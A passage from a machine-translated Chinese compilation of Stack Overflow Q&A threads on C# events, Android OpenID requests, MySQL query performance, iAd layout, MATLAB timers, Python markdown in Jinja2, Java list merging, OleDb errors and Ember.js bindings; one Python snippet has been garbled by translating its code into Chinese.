
    //...code that causes instances of B to be added to the list
    //and calls functions on those B instances that might get A.FooHandler raised

    public void Add(B item)
    {
        MyListofBs.Add(item);
        item.a.FooHandler += EventAction;
    }

    public void Remove(B item)
    {
        item.a.FooHandler -= EventAction;
        MyListofBs.Remove(item);
    }

    private void EventAction(string s)
    {
        // This is invoked when "A.FooHandler" is raised for any 
        // item inside the MyListofBs collection.
    }
} 
```

* * *

**编辑：**如果您想在 中进行接力活动`C`，请执行以下操作：

```
public class C
{
    private List<B> MyListofBs = new List<B>();

    public event Action<string> RelayEvent;

    //...code that causes instances of B to be added to the list
    //and calls functions on those B instances that might get A.FooHandler raised

    public void Add(B item)
    {
        MyListofBs.Add(item);
        item.a.FooHandler += EventAction;
    }

    public void Remove(B item)
    {
        item.a.FooHandler -= EventAction;
        MyListofBs.Remove(item);
    }

    private void EventAction(string s)
    {
        if(RelayEvent != null)
        {
            RelayEvent(s);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:10:55.853

订阅您的 B.foohandler 事件

```
Foreach(var item in MyListofBs) 
{

      Item.fooHandler += new EventHandler(CEventHandler) 
}
   //each time your Events are called you reroute it with C.EventHandler 
Private CEventHandler(string blah) 
{    
    If(FooHanler!=null)
       FooHanler(); 
} 
```

浏览以下示例[事件教程](http://msdn.microsoft.com/en-us/library/aa645739%28v=vs.71%29.aspx)

# java - 与 Google OpenID 服务器通信返回 400

> ID：15555861
> 
> 赞同：2
> 
> 时间：2013-03-21T18:55:36.457
> 
> 标签：java, android, authentication, openid, single-sign-on

我正在尝试在 Android 上实现 OpenId 并不断收到 400 错误。我猜我的参数格式不正确。

我将参数基于此浏览器行，它可以正确地将我带到服务器：

```
https://www.google.com/accounts/o8/ud
?openid.ns=http://specs.openid.net/auth/2.0
&openid.claimed_id=http://specs.openid.net/auth/2.0/identifier_select
&openid.identity=http://specs.openid.net/auth/2.0/identifier_select
&openid.return_to=http://www.example.com/checkauth
&openid.realm=http://www.example.com/
&openid.assoc_handle=ABSmpf6DNMw
&openid.mode=checkid_setup 
```

这是代码

```
 try {

         HttpsURLConnection con; 

         URL url2 = new URL("https://www.google.com/accounts/o8/ud");
         con = (HttpsURLConnection) url2.openConnection();
         con.setDoInput(true);
         con.setDoOutput(true);

         con.setRequestMethod("GET");

         List<NameValuePair> params = new ArrayList<NameValuePair>();
         params.add(new BasicNameValuePair("openid.ns", "http://specs.openid.net/auth/2.0"));
         params.add(new BasicNameValuePair("openid.claimed_id", "http://specs.openid.net/auth/2.0/identifier_select"));
         params.add(new BasicNameValuePair("openid.identity", "http://specs.openid.net/auth/2.0/identifier_select"));
         params.add(new BasicNameValuePair("openid.return_to", "http://www.example.com/checkauth"));
         params.add(new BasicNameValuePair("openid.realm", "http://www.example.com/"));
         params.add(new BasicNameValuePair("openid.assoc_handle", "ABSmpf6DNMw"));
         params.add(new BasicNameValuePair("openid.mode", "checkid_setup"));

         String content = AuthUtils.getRequestParams(params);
         con.setFixedLengthStreamingMode(content.getBytes("UTF-8").length);

         OutputStream out = con.getOutputStream();
         BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(out, "UTF-8"));
         writer.write(content);
         writer.close();
         out.close();            

         Log.d(TAG, "response code = " + con.getResponseCode());

         BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream()));

         String input;

         while ((input = br.readLine()) != null){
             System.out.println(input);
         }
         br.close();             

        } catch (MalformedURLException e) {
             Log.e(TAG, e.toString());
            e.printStackTrace();
        } catch (IOException e) {
             Log.e(TAG, e.toString());
         e.printStackTrace();
        } catch (Exception e) {
             Log.e(TAG, e.toString());
             e.printStackTrace();
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-06T12:30:56.973

来自谷歌的[文档](https://sites.google.com/site/oauthgoog/fedlogininterp/openiddiscovery)：

***如果提供的域不是由 Google 托管，** Google 的端点将在端点 (2) 上返回 400。因此，对于想要迎合 Google Apps 客户的 RP，一种可能的策略是首先尝试端点 (2)，如果返回 400，则尝试端点 (1)，如果没有产生任何结果，则放弃。其他策略（例如，并行获取两个端点）是可能的。*

[更多信息在这里](https://stackoverflow.com/a/7603887/2015318)

# mysql - 奇怪的 MySQL 查询性能

> ID：15555862
> 
> 赞同：1
> 
> 时间：2013-03-21T18:55:38.227
> 
> 标签：mysql

[已解决：查看编辑 2] 以下查询需要 37 秒才能完成（此查询获取用户发布的第 50 个帖子和相应的创建日期）

```
SELECT p.id, 
       (SELECT id 
        FROM   posts 
        WHERE  owneruserid = p.id 
        ORDER  BY creationdate 
        LIMIT  49, 1) AS post50id, 
       (SELECT creationdate 
        FROM   posts 
        WHERE  id = post50id) 
FROM   prol_users p 
WHERE  postcount >= 50 
```

而以下需要 30 分钟才能完成（第 5 篇文章）

```
SELECT p.id, 
       (SELECT id 
        FROM   posts 
        WHERE  owneruserid = p.id 
        ORDER  BY creationdate 
        LIMIT  4, 1) AS post5id, 
       (SELECT creationdate 
        FROM   posts 
        WHERE  id = post5id) 
FROM   prol_users p 
WHERE  postcount >= 50 
```

请注意，这是我第一次运行查询，因此不涉及缓存。第一个查询和第二个查询之间的唯一区别是`limit 49,`1 vs`limit 4, 1`

查询限制为 50 行时比限制为 5 行时花费的时间更短，有什么原因吗？

* * *

解释输出：

```
--Note: The faster one, limit 50
mysql> explain select p.id, (select id from posts where owneruserid = p.id order by creationdate limit 49,1) as post50id, (select creationdate from posts where id = post50id) from prol_users p where postcount >= 50;
+----+--------------------+-------+--------+--------------------------+-----------------+---------+------------+--------+-----------------------------+
| id | select_type        | table | type   | possible_keys            | key             | key_len | ref        | rows   | Extra                       |
+----+--------------------+-------+--------+--------------------------+-----------------+---------+------------+--------+-----------------------------+
|  1 | PRIMARY            | p     | ALL    | NULL                     | NULL            | NULL    | NULL       | 199026 | Using where                 |
|  3 | DEPENDENT SUBQUERY | posts | eq_ref | PRIMARY                  | PRIMARY         | 4       | func       |      1 | Using where                 |
|  2 | DEPENDENT SUBQUERY | posts | ref    | idx_owneruserid,idx_ouid | idx_owneruserid | 5       | jagat.p.id |     11 | Using where; Using filesort |
+----+--------------------+-------+--------+--------------------------+-----------------+---------+------------+--------+-----------------------------+
3 rows in set (0.00 sec)

--Note: The slower one, limit 5
mysql> explain select p.id, (select id from posts where owneruserid = p.id order by creationdate limit 4,1) as post5id, (select creationdate from posts where id = post5id) from prol_users p where postcount >= 50;
+----+--------------------+-------+--------+--------------------------+------------------+---------+------+--------+-------------+
| id | select_type        | table | type   | possible_keys            | key              | key_len | ref  | rows   | Extra       |
+----+--------------------+-------+--------+--------------------------+------------------+---------+------+--------+-------------+
|  1 | PRIMARY            | p     | ALL    | NULL                     | NULL             | NULL    | NULL | 199026 | Using where |
|  3 | DEPENDENT SUBQUERY | posts | eq_ref | PRIMARY                  | PRIMARY          | 4       | func |      1 | Using where |
|  2 | DEPENDENT SUBQUERY | posts | index  | idx_owneruserid,idx_ouid | idx_creationdate | 8       | NULL |      5 | Using where |
+----+--------------------+-------+--------+--------------------------+------------------+---------+------+--------+-------------+
3 rows in set (0.00 sec) 
```

编辑：我测试了各种限制值，并注意到当限制从 9,1 更改为 10,1 时性能会显着提高。事实上，解释计划也发生了变化（变为 50）。关于它为什么这样做的任何见解？此外，我添加了一个索引帖子（创建日期，所有者用户 ID）并且性能没有明显差异。

Edit2：终于通过`force index (idx_owneruserid)`在第一个子查询上使用它来工作。经验教训：当解释计划未按预期使用您的索引时，请使用强制索引。

# objective-c - iAd 不适合屏幕宽度

> ID：15555863
> 
> 赞同：0
> 
> 时间：2013-03-21T18:55:38.623
> 
> 标签：objective-c, ipad, cocoa-touch, iad

我正在尝试将 iAd 添加到我的 iPad 应用程序中，该应用程序仅适用于横向。但是，当广告出现时，它不适合横向的宽度（它具有纵向的尺寸）。我已经在下面设置了自动调整大小的蒙版，但没有任何反应。你如何让它发挥作用？

```
[iAd setAutoresizingMask:UIViewAutoresizingFlexibleRightMargin |  UIViewAutoresizingFlexibleTopMargin |  UIViewAutoresizingFlexibleHeight]; 
```

![在此处输入图像描述](../Images/3059647b9edbcffb5636da941d583637.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T01:38:25.963

已`ADBannerView`存在于 XIB 文件中，并使用`IBOutlet`. 即使`ADBannerView`在 XIB 中进行了扩展，它也不会在设备上以这种方式显示。即使设置自动调整大小的蒙版并使用自动布局也无济于事。所以，我手动设置了 iAd 框架的宽度。

```
iAd.frame = CGRectMake(iAd.frame.origin.x, iAd.frame.origin.y, 1024, iAd.frame.size.height); 
```

# function - Matlab定时器未定义函数或变量

> ID：15555869
> 
> 赞同：1
> 
> 时间：2013-03-21T18:56:14.460
> 
> 标签：function, matlab, audio, callback

我有一个关于 matlab 计时器对象的问题。我的 gui 中有一个按钮，它创建一个计时器，每个 0.1 的周期我想调用我的函数。

```
function playBtn_Callback(hObject, eventdata, handles)
global pl;
global c;
global g;
global t;
global myData;
if isplaying(pl)
     pause(pl);
     set(handles.playBtn, 'string', 'Play');
else 
     resume(pl);
     set(handles.playBtn, 'string', 'Pause');
end
myData=guidata(handles.timertext);
c=get(pl, 'CurrentSample')
g=get(pl, 'TotalSample')
a = timer;
set(a, 'ExecutionMode', 'FixedRate');
set(a, 'TimerFcn', 'myFunction', 'Period', 0.1);
start(a);

function t = myFunction()
global mydata;
global pl;
global sf;
global mySong;

c=get(pl, 'CurrentSample')
set(mydata.timertext, 'String', c/sf); 
```

sf 是我歌曲的频率。

我得到的错误是这样的：

为计时器“timer-26”评估 TimerFcn 时出错

未定义的函数或变量“myFunction”。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-03-21T18:58:47.047

您需要为“TimerFcn”的值传递函数句柄，而不是字符串。因为你的函数在你的 UI m 文件中，它不能被外部访问（没有一些技巧），所以你必须传递一个实际的函数句柄而不是一个字符串。（否则它将调用 str2func 并获取它不能使用的函数句柄）。

如果您不知道我在说什么，请阅读[http://www.mathworks.co.uk/help/matlab/matlab_prog/creating-a-function-handle.html](http://www.mathworks.co.uk/help/matlab/matlab_prog/creating-a-function-handle.html)。

您还应该查看 guidata 函数的文档 - 无需使用全局变量。

# python - 抑制 python markdown 包装文本

> ID：15555870
> 
> 赞同：13
> 
> 时间：2013-03-21T18:56:14.777
> 
> 标签：python, markdown, jinja2, templating

我使用 python [markdown](https://python-markdown.github.io/)作为 Jinja2 的过滤器来生成 html。作为其中的一部分，我从渲染输入中填写表格条目。通过降价过滤器传递输入总是将文本包装在段落标签中，因此表中的每个条目都包装在 中`<p></p>`，这是我不想要的。

我已经阅读了降价文档和第 3 方扩展列表，但似乎除了编写我自己的扩展之外没有办法抑制这种行为。没有其他方法可以抑制段落标签换行吗？还是我以错误的方式解决这个问题？

**更新**：这是我现在正在使用的肮脏肮脏可怕的黑客：

```
def safe_markdown(text):
  p = '<p>'
  np = '</p>'
  md = markdown.markdown(text)
  if md.startswith(p) and md.endswith(np): #you filthy bastard
    md = md[len(p):-len(np)]
  return jinja2.Markup(md)

env = jinja2.Environment(...)
env.filters['markdown'] = safe_markdown 
```

**更新 2**（回应亚伦的回答）：

感谢您的帮助，但这绝对是导致问题的降价。这是 jinja 模板的示例部分：

```
 {%- if spc.docs -%}
<td>{{ spc.docs|markdown }}</td></tr>
        {%- else -%}
<td></td></tr>
        {%- endif -%} 
```

如果`spc.docs`只是`'foo'`生成的 html 将结束，`<td><p>foo</p></td></tr>`除非我使用肮脏的黑客。

**更新 3**

这是一个不那么讨厌的黑客，虽然仍然是一个黑客而不是真正的“答案”，IMO。

```
def safe_markdown(text):
    md = markdown.markdown(text)
    return jinja2.Markup(md)

def safe_markdown_td(text):
    text = ''.join(['<td>', text, '</td>'])
    return safe_markdown(text)

env = jinja2.Environment(...)
env.filters['markdown'] = safe_markdown
env.filters['markdowntd'] = safe_markdown_td 
```

那么模板就变成了：

```
 {%- if spc.docs -%}
{{ spc.docs|markdowntd }}</tr>
        {%- else -%}
<td></td></tr>
        {%- endif -%} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T19:00:00.053

任何时候你使用 markdown，你都必须在 html 的最终结构上接受一些相当严重的妥协。有许多你根本无法表达的结构。不要把它当成是html的替代品，把它当成另一种语言来简单地写内容。

可能发生的情况是将表格单元格内容包装在段落标签中会弄乱您的布局，在这种情况下，您应该使用 CSS 修复它：

```
td p {
  margin: 0;
  padding: 0;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2020-09-13T00:10:35.687

只是偶然发现了同样的问题 - 不需要的开始/结束段落标签免费从`markdown.markdown()`.

对于我不想`markdown()`包装为段落的字符串，以下内容对我很有用。我没有直接调用，而是将调用`markdown()`包装在一个正则表达式中，该表达式去除了有问题的段落标记，并且不会干扰嵌入在我的降价中的任何[预期的硬包装。](https://daringfireball.net/projects/markdown/syntax#p)

```
from markdown import markdown

# ... other stuff ...

def no_p_markdown(non_p_string) -> str:
    ''' Strip enclosing paragraph marks, <p> ... </p>, 
        which markdown() forces, and which interfere with some jinja2 layout
    '''
    return re.sub("(^<P>|</P>$)", "", markdown(non_p_string), flags=re.IGNORECASE)

# ... other stuff ...

non_p_html = no_p_markdown("my markdown text not intended for a paragraph") 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-16T23:44:01.787

我同意，那个黑客是肮脏的（但总比没有好）。

根据我的经验，表格内部的怪异，特别`<td>`是由于标记格式错误。在您的情况下，这可能是相同的问题。

```
>>> import markdown
>>> markdown.version
'2.1.1'
>>> text = '''
... <table>
... <tr>
...     <td>
...             Here's some fancy text
...
...             and some more
...     </td>
...     <td>Here's other text</td>
... </tr>
... </table>
... 
... This should be in a **paragraph.**
... '''
>>> markdown.markdown(text)
u"<table>
<tr>
    <td>
        Here's some fancy text

        and some more
    </td>
    <td>Here's other text</td>
</tr>
</table>
<p>This should be in a <strong>paragraph.</strong></p>" 
```

^ 看到了吗？表格中没有疯狂的段落标签。

Jinja喝醉的可能性也很小，并添加了这些标签。我个人没有注意到这种行为，但无论是否使用模板过滤器，都值得尝试这个实验。

还有一件事。Markdown 摇滚，虽然你会失去*一些*控制，但我认为你做出了一个很好的选择。

**编辑**对不起Elhefe，我不完全理解发生了什么。我也遇到过这个问题！`<div>`我的解决方案：如果我不想要段落，就把那个垃圾包起来。

```
>>> markdown.markdown(text)
u'<p>Here be some <em>foo</em></p>'
>>> text = '<div>Here be some *foo*</div>'
>>> markdown.markdown(text)
u'<div>Here be some *foo*</div>' 
```

但这并不能解决您的问题。我唯一能想到的就是在`<td></td>`标记之前将文本包装起来。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-10-24T15:25:32.227

...另一种去除烦人的外部标签的方法是编写一个简单的剥离函数：

```
def strip(s):
    """ strips outer html tags """

    start = s.find('>')+1
    end = len(s)-s[::-1].find('<')-1

    return s[start:end] 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-10-19T11:40:30.953

`<p> </p>`标签弄乱了我的桌子，我也遇到了同样的问题。对我来说最简单的解决方案是通过添加

```
td p {display:inline;} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2022-01-31T03:32:25.097

当我使用 Markdown 将 HTML 标记添加到配置文件中的某些用户定义的字符串时，我遇到了同样的问题，这样他们就不必学习 HTML（这就是 Markdown 的用途，对吗？）。这些字符串被嵌入到其他可能已经是

元素。所以我不想在中间再有一个。两件事情：

1.  Markdown 的 convert() 不加

    如果提供的文本已经被任何块级标签包裹（在此处列出：[https](https://developer.mozilla.org/en-US/docs/Web/HTML/Block-level_elements) ://developer.mozilla.org/en-US/docs/Web/HTML/Block-level_elements ），则为提供的文本添加标签。

2.  如果这对您不起作用，那么我扩展了 Markdown 以覆盖 convert() 方法以剥离

    标签。

```
    从降价进口降价
    EMarkdown 类（降价）：
    def 转换（自我，文本）：
        t = super().convert(文本)
        t = t.removeprefix("<p>").removesuffix("</p>")
        返回

```

将此扩展到所有块级标签作为练习留给读者。;-)

# java - 高效的 Java 列表合并算法

> ID：15555884
> 
> 赞同：0
> 
> 时间：2013-03-21T18:56:59.347
> 
> 标签：java, algorithm, list, arraylist

我有两个 Java 列表（在实际类中），每个都有编号列表和级别的元素，表示为 String 对象。下面的每一行都是列表中的一个单独的字符串。例如，第一个列表可能是：

```
==level 1==
1.1 2

==level 2==
1.R4 0
2.0 2

==level 3==
3.R3 1
4.R5 1 
```

第二个可能是：

```
==level 3==
1.null
2.null 
```

列表可以是任意长度，数字后面的值在这里无关紧要。目标是合并匹配的级别列表。例如，上面两个列表的合并将是：

```
==level 1==
1.1 2

==level 2==
1.R4 0
2.0 2

==level 3==
1.null
2.null
3.R3 1
4.R5 1 
```

两个列表的匹配级别中的数字永远不会相同，因此不需要检查。我也相信这些数字将永远是连续的。这是我到目前为止所拥有的，但它并不涵盖所有情况，特别是当合并仅发生在关卡的开头或仅在结尾时。看着也很不爽。tempLines 和lines 是两个列表。

```
for(int x=0; x < lines.size();x++){
            for(int y=0; y < tempLines.size();y++){
                if(tempLines.get(y).equals(lines.get(x)) && !(tempLines.get(y).equals("\n"))&& !(lines.get(x).equals("\n"))){
                    int a=y+1;
                    int b=x+1;
                    while(!(tempLines.get(a).equals("\n"))){
                        while(!(lines.get(b).equals("\n"))){
                            if(Integer.valueOf(tempLines.get(a).charAt(0))==(Integer.valueOf(tempLines.get(a).charAt(0))-1))
                                lines.add(b,tempLines.get(a));
                        }
                    }
                }
            }
        } 
```

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T20:28:24.033

鉴于您的两个输入列表都按升序排序，您可以使用合并两个排序列表/数组的标准方法。要点是您不需要在算法中使用嵌套循环，而是交替遍历两个列表，始终将较低的元素附加到结果中并在该列表中前进。这是关于数字和级别之间差异的草图。

```
int ix_a = 0;
int ix_b = 0;
List<String> result = new ArrayList<String>();
while (ix_a < A.size() || ix_b < B.size()) {

    // No more elements in A => append everything from B to result
    if (ix_a == A.size()) {
        result.add(B.get(ix_b));
        ix_b++;
        continue;
    }

    // No more elements in B => append everything from A to result
    if (ix_b == B.size()) {
        result.add(A.get(ix_a));
        ix_a++;
        continue;
    } 

    // Always append the lower element and advance in that list. 
    // If both lists contain the same element, append this once and advance in both lists
    // Distinguish between levels and numbers here, levels take higher precedence.
    String a = A.get(ix_a);
    String b = B.get(ix_b);
    if (isLevel(a) && isLevel(b)) {
        if (isLowerLevel(a, b)) {
            result.add(a);
            ix_a++;
        } else if (isLowerLevel(b, a)) {
            result.add(b);
            ix_b++;
        } else {
            result.add(a);
            ix_a++;
            ix_b++;
        }
    } else if (isLevel(a)) {
        result.add(b);
        ix_b++;
    } else if (isLevel(b)) {
        result.add(a);
        ix_a++;
    } else {
        if (isLowerNumber(a, b)) {
            result.add(a);
            ix_a++;
        } else if (isLowerNumber(b, a)) {
            result.add(b);
            ix_b++;
        } else {
            result.add(a);
            ix_a++;
            ix_b++;
        }
    }
} 
```

这可以通过省略不必要的重复检查`isLevel(...)`等来进一步优化。还必须添加对空行的处理。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T19:36:09.740

我通常通过处理来解决这个问题`Map`。可以使用其他集合，例如列表，但我发现使用地图的代码更易于阅读（并且可能不是性能问题，除非您的列表包含数百万个元素）。

在这种情况下，我将有一个`Map<Integer,String>`用于保持条目正确顺序的方法。此类地图将作为值存储在另一个地图中，其中键是级别编号。我将`TreeMap`用作实现类，因为它根据条目的键对条目进行排序。

```
Map<Integer,Map<Integer,String>> map = new TreeMap<>();
int level=0; //current level
for (String line:templines) {
 if (line.startsWith("==level ")) { 
   level=Integer.valueOf(line.substring(7).replace("==","").trim());
   if (map.get(level)==null) map.put(level,new TreeMap<>());
 } else if (line.length>0) {
   int pos = line.indexOf('.');
   if (pos>0) {
    int n = Integer.valueOf(line.substring(0,pos));
    line=line.substring(pos+1);
    map.get(level).put(n,line); 
   }
 }
} 
```

获得地图后，我将对其进行迭代并将值保存在另一个列表中。

```
List<String> merged = new ArrayList<String>();
for (Map.Entry<Integer,Map<Integer,String>> entry:map.entrySet()) {
  list.add("==level "+entry.getKey()+"==");
  for (String line:entry.getValue().values()) {
   list.add(line);
  }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-21T20:24:19.083

基本上，您必须使用 Map 将每个级别作为键并将行列表作为值。处理完要合并的列表后，获取键集并按降序对其进行排序，以便对级别进行排序。然后，您可以使用排序的键/级别开始迭代映射值。将级别添加到 dest 列表中，对实际级别的列表进行排序并将其所有元素也添加到 dest。

这是我想出的：

```
public class MergeLists {

    private final static String[] list1 = {
        "==level 1==\r\n", 
        "1.1 2\r\n", 
        "\r\n", 
        "\r\n", 
        "==level 2==\r\n", 
        "1.R4 0\r\n", 
        "2.0 2\r\n", 
        "\r\n", 
        "\r\n", 
        "==level 3==\r\n", 
        "3.R3 1\r\n", 
        "4.R5 1"
    };

    private final static String[] list2 = {
        "==level 3==\r\n", 
        "1.null\r\n", 
        "2.null"
    };

    @Test
    public void mergLists() {
        List<List<String>> listList = new ArrayList<>();
        listList.add(Arrays.asList(list1));
        listList.add(Arrays.asList(list2));
        List<String> mergedList = mergLists(listList);
        for(String s : mergedList) {
            System.out.println(s);
        }
    }

    public List<String> mergLists(List<List<String>> listList) {
        List<String> mergedList = new ArrayList<>();
        Map<String, List<String>> levelMap = new HashMap<String, List<String>>();
        for(int j = 0; j < listList.size(); j++) {
            List<String> list = listList.get(j);
            String actLevel = null;
            for(int i = 0; i < list.size(); i++) {
                String line = list.get(i).trim();
                if(isLevel(line)) {
                    actLevel = line;
                } else {
                    if(actLevel != null) {
                        List<String> levelList = levelMap.get(actLevel);
                        if(levelList == null) {
                            levelList = new ArrayList<>();
                            levelMap.put(actLevel, levelList);
                        }
                        levelList.add(line);
                    } else {
                        System.out.println("line " + (i+1) + " in list " + (j+1) + " does not belong to a level.");
                    }
                }
            }
        }

        List<String> sortedLevelList = new ArrayList<>(levelMap.keySet());
        Collections.sort(sortedLevelList, new Comparator<String>() {
            @Override
            public int compare(String o1, String o2) {
                return (extractNumberFromLevel(o1) - extractNumberFromLevel(o2));
            }

            private int extractNumberFromLevel(String level) {
                // check that this meets the format of your level entry (assuming "==level n==")
                int r = 0;
                int i = level.indexOf("level");
                if(i != -1) {
                    int j = level.lastIndexOf("==");
                    if(j != -1) {
                        String n = level.substring(i + "level".length(), j).trim();
                        try {
                            r = Integer.parseInt(n);
                        } catch(NumberFormatException e) {
                            // ignore and return 0
                        } 
                    }
                }
                return r;
            }
        });

        for(String level : sortedLevelList) {
            List<String> lineList = levelMap.get(level);
            Collections.sort(lineList, new Comparator<String>() {
                @Override
                public int compare(String o1, String o2) {
                    return o1.trim().length() == 0 ? 1 /* this puts the empty string at the end of the list */ 
                            : (extractNumberFromLine(o1) - extractNumberFromLine(o2));
                }

                private int extractNumberFromLine(String o) {
                    // check that this meets the format of your line entry (assuming "n.1 2")
                    int r = 0;
                    int i = o.indexOf('.');
                    if(i != -1) {
                        String n = o.substring(0, i).trim();
                        try {
                            r = Integer.parseInt(n);
                        } catch(NumberFormatException e) {
                            // ignore and return 0
                        }
                    }
                    return r;
                }
            });

            mergedList.add(level);
            mergedList.addAll(lineList);
        }

        return mergedList;
    }

    private boolean isLevel(String line) {
        // check that this meets the format of your level entry (assuming "==level n==")
        return line.contains("level");
    }
} 
```

输出

```
==level 1==
1.1 2

==level 2==
1.R4 0
2.0 2

==level 3==
1.null
2.null
3.R3 1
4.R5 1 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-21T19:01:50.060

您可以按级别拆分集合并使用 Apache Commons Collections。

```
Collection a = createCollection();
Collection b = createCollection();

Collection c = CollectionUtils.union(a,b); 
```

# c# - OleDbConnection 错误：您的网络访问被中断

> ID：15555885
> 
> 赞同：0
> 
> 时间：2013-03-21T18:57:03.020
> 
> 标签：c#, 64-bit, oledbconnection, oledbcommand

我正在使用 ACE OLEDB 对 MS Access mdb 文件运行查询。这适用于 x86 机器，但在 x64 上失败。

C# 代码（使用目标平台 x86 构建）：

```
string conn = "Provider=Microsoft.ACE.OLEDB.12.0;data source=" + @"C:\abc\db\file.mdb";
OleDbConnection _connOle = new OleDbConnection(conn);
_connOle.Open();

OleDbCommand cmd = new OleDbCommand();
cmd.Connection = _connOle;
cmd.CommandType = CommandType.Text;
cmd.CommandText = "select * from myTable";

cmd.ExecuteReader(); 
```

我得到的错误是“您的网络访问被中断。要继续，请关闭数据库，然后再次打开它。”

**更新：**仅当我的 mdb 文件具有链接表时才会发生这种情况。如果表被导入，这不会发生！让我补充一点，我已确保用户对文件夹 \AppData\Local\Temp 具有完全访问权限，以防 ACE.OLEDB 引擎需要访问它以临时存储链接表。

有想法该怎么解决这个吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T19:56:39.330

关闭现有连接，将其添加到末尾：

```
conn.close(); 
```

# javascript - Ember.js 控制器和视图绑定（ember.js 方式...）

> ID：15555889
> 
> 赞同：2
> 
> 时间：2013-03-21T18:57:15.417
> 
> 标签：javascript, ajax, ember.js, sinatra

*对于这个问题的长度，我深表歉意，但我缺乏将其缩短的洞察力。*

我正在尝试学习 Ember.js，但在理解控制器之间的关系时遇到了一些麻烦。特别是因为它与控制器属性和视图绑定有关。*我有一个可以工作*的应用程序......但我真的不明白为什么&我觉得*（很明显）*这不是'Ember.js'的方式。

需要考虑的一些事项：根据我在指南/文档中解释为“正确”结构的内容，此应用程序被分解为目录/文件，此应用程序在 sinatra 应用程序的上下文中运行。这个应用程序虽然不完整，但到目前为止确实按我期望的方式工作。

该应用程序不完整，但这里是我期望和我正在尝试做的事情的一般概述：

1) 用户到达根 URL '/' 并转换到 '/locate' URL。

2) LocateController 获取用户位置，用 lat/lng 填充两个表单字段。

3) 表单以 POST 形式提交给服务器，以 ajax 形式发送到 sinatra '/locate' 路由。

*（请求由服务器处理）*

4) 用户被转换到 ember.js '#/located' 路由。

5) 信息作为 JSON 对象从服务器返回并显示

*到目前为止，我只实施了第一步。如果我添加了提交按钮，则可以发送表单，但想法是让它自动发生。*

**定位视图中的字段使用表单字段的正确值填充。但是，我使用直接 jQuery 来更新值，在我看来，这不是在 ember.js 应用程序中执行此操作的“正确”方式**

下面是我的一些代码。为简洁起见，我将只提供片段，因为我觉得如果您知道正确的答案，您将能够从提供的片段中得出它。

我的视图是这样设置的： *我在我的 sinatra 应用程序中使用 slim*

```
script type="text/x-handlebars" data-template-name="application"
    | {{ outlet }}
script type="text/x-handlebars" data-template-name="locate"
    | {{ message }}
    | <form id="coordinates">
    |     {{view Ember.TextField id="latitude" name="latitude" valueBinding="latitude" class="latitude"}}
    |     {{view Ember.TextField id="longitude" name="longitude" valueBinding="longitude" class="longitude"}}
    | </form>
 script type="text/x-handlebars" data-template-name="located"
    | <p id="message">{{ message }}</p>
    | <p id="latitude">{{ latitude }}</p>
    | <p id="longitude">{{ longitude }}</p> 
```

脚本 src="assets/js/app/application.js"

应用程序视图.js

```
Application.ApplicationView = Ember.View.extend({
  templateName: 'application'
});

Application.LocateView = ApplicationView.extend({
  templateName: 'locate'
});

Application.LocatedView = ApplicationView.extend({
  templateName: 'located'
}); 
```

应用控制器.js

```
var GeoLocation;

GeoLocation = (function(location){
    $('#latitude').val(location.coords.latitude),
    $('#longitude').val(location.coords.longitude)
});

navigator.geolocation.getCurrentPosition(GeoLocation)

Application.ApplicationController = Ember.Controller.extend({
  message: "Hello from Application"
});

Application.LocateController = Ember.Controller.extend({
    message: "Hello from Locate",
    latitude: "-- lat --", 
    longitude: "-- lng --",
});

Application.LocatedController = Ember.Controller.extend({
    message: "Hello from Located",
    latitude: "-- lat --",
    longitude: "-- lng --",
}); 
```

路由器.js

```
Application.Router.map(function() {
  this.route('index');
  this.route('locate');
  this.route('located');
});

Application.ApplicationRoute = Ember.Route.extend({
  events: {
    goToLocate: function() {
      this.transitionTo('locate');
    },
    goToLocated: function() {
      this.transitionTo('located');
    }
  }
});

Application.IndexRoute = Ember.Route.extend({
  redirect: function() {
        this.render('application');
    this.transitionTo('locate');
  }
});

Application.LocateRoute = Ember.Route.extend({
  redirect: function() {
        this.render('locate');
    //this.transitionTo('located');
  }
});

});

Application.LocatedRoute = Ember.Route.extend({
  renderTemplate: function(controller) {
    this.render('located');
  }
}); 
```

我已经阅读了 ember.js 网站上的指南和 API 文档，并查看了 GitHub 上的 repo。我觉得“正确”的实现会为纬度和经度属性使用计算属性，但我不太明白它在实践中是如何工作的。

此外，我知道很可能有更好的方法来处理将信息发送到服务器（可能是 JSON 或 ember-data，当我走到那一步时？），并随时分享您对此的任何见解。但是现在，由于我对 sinatra 及其工作方式感到满意，我更喜欢一个不需要对我的后端进行重大重构的解决方案。（也就是说，能够从 sinatra 的 params[:hash] 访问位置数据）。

提前感谢您的帮助并花时间阅读这个相当长的问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-21T20:11:08.540

我同意在 ember 应用程序中通过 jQuery 设置输入值不是可行的方法。Ember 在绑定到属性方面做得非常好。我建议由于您在初始加载时重定向到 Locate 路由，因此将 getLoaction 逻辑移动到 LocateController 或将其设置在路由 setupController 挂钩中，请参见此处[（请参见此处的 setupController 示例）](http://emberjs.com/guides/controllers/representing-a-single-model-with-objectcontroller/) ...您还可以在您的应用程序实例，如果您想访问它们。

所以，而不是这个：

```
var GeoLocation;

GeoLocation = (function(location){
    $('#latitude').val(location.coords.latitude),
    $('#longitude').val(location.coords.longitude)
});

navigator.geolocation.getCurrentPosition(GeoLocation) 
```

我会在路线上这样做：

```
App.LocateRoute = Ember.Route.extend({
  setupController: function(controller, model) {
